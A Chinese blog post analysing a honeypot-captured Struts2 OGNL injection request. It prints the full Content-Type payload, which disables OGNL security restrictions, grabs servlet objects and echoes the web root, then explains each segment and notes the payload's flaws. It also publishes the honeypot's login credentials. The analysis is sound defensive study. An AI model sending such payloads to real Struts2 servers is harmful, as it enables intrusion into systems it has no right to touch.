ailx10说：这篇是在2024年5月之前写的，后来又改过。蜜罐上线后，有朋友也开始进去看数据，看到最近登录时间更新，我还挺有参与感。随后一条 Content-Type 里的 OGNL 表达式把注意力拉回了载荷：放开成员访问、取得 Servlet 对象、输出路径，再复制内容，每一步都藏在长字符串里。我就把它拆成几段看，省得一眼只认出“Struts2”就结束。文章留下的是蜜罐开张后的一个具体访客，也让我把以前课本上见过的表达式，重新放回真实请求里认了一遍。

---

本文分析蜜罐收到的一条疑似 OGNL 注入请求，目的是理解载荷意图；请求出现并不代表执行成功。

```
蜜罐网址：https://ailx10.hackbiji.top:4433/web
用户名：ailx10
密码：ailx10@hacker
```

原文根据 IP 查询得到地域线索；IP 地理位置不能证明操作者的身份或所在地。

```
GET/login/login.jspHTTP/1.1
Accept:*/*
Accept-Encoding:gzip, deflate
Connection:keep-alive
Content-Type:%{(#fuck='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#req=@org.apache.struts2.ServletActionContext@getRequest()).(#outstr=@org.apache.struts2.ServletActionContext@getResponse().getWriter()).(#outstr.println(#req.getRealPath("/"))).(#outstr.close()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
User-Agent:Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36
```

以下按原文拆解表达式。尾部 process 未定义，且关闭 writer 后继续使用 outputstream 存在疑点，需要对照完整上下文验证。

OGNL表达式上下文设置：定义一个变量`#fuck`为'multipart/form-data

```
%{(#fuck='multipart/form-data')
```

默认成员访问设置：定义变量![原文图表](/notes-assets/1dcd026e3db7a86275be.svg)`#dm`为OGNL上下文中的默认成员访问权限

```
.(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)
```

检查并设置成员访问权限：检查是否存在`#_memberAccess`，如果存在，则设置为`#dm`

```
.(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container'])
```

清除OGNL安全限制![原文图表](/notes-assets/1dcd026e3db7a86275be.svg)：获取`OgnlUtil`实例，移除安全限制

```
.(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))
.(#ognlUtil.getExcludedPackageNames().clear())
.(#ognlUtil.getExcludedClasses().clear())
.(#context.setMemberAccess(#dm)))
```

获取HTTP请求和响应对象：

```
.(#req=@org.apache.struts2.ServletActionContext@getRequest())
.(#outstr=@org.apache.struts2.ServletActionContext@getResponse().getWriter())
```

输出网站`/`的真实路径：比如 `/var/www/html/`

```
.(#outstr.println(#req.getRealPath("/")))
.(#outstr.close())
```

获取响应输出流和执行命令：

```
.(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))
.(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))
.(#ros.flush())}
```

载荷里还有未定义变量和输出流冲突，所以它表达的打算不能自动算成成功。把每个动作与目标侧结果对应，蜜罐日志才真正能帮助判断攻击走到了哪里。
